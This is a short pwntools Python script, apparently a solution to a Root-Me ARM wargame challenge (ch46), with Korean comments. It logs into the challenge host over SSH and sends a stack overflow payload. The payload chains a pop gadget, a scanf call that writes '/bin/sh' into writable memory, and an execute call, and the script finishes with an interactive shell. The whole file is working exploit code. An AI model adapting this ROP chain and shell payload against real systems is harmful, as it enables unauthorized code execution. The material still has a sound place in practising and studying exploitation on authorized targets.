from pwn import *

context.update(arch='arm', os='linux')
r = ssh(user="app-systeme-ch46", host="challenge04.root-me.org", port=2224, password="app-systeme-ch46")
p = r.process(executable="/challenge/app-systeme/ch46/ch46",
              cwd="/challenge/app-systeme/ch46", env={})

p.recvuntil('dump:')

sh = 0x22000-0x50 # 쓰기권한이 존재하는 영역
execute = 0x10580
rop = 0x0001055c # gadget: pop {r0, r1, r4, r8, fp, ip, sp, pc}
fmt = 0x10704 # scanf 포맷스트링 부분(%s)
ret = 0x10668 # scanf 호출 부분

payload = b''
payload += cyclic(68) # fp까지 채움
payload += p32(rop) # ret
payload += p32(fmt) # 가젯의 r0
payload += p32(sh) # 가젯의 r1
payload += p32(sh)*5 # 가젯의 r4, r8, fp, ip, sp 부분
payload += p32(ret) # 가젯의 pc

p.sendline(payload)

payload = p32(rop)
payload += p32(sh+36) # 가젯의 r0 -> 36byte 떨어진 위치에 binsh 문자열 write 예정이므로 다음과 같이 작성
payload += p32(sh-0x100)*6 # 가젯의 r1, r4, r8, fp, ip, sp
payload += p32(execute) # 가젯의 pc
payload += b'/bin/sh\x00'

p.sendline(payload)

p.sendline("whoami")
p.interactive()
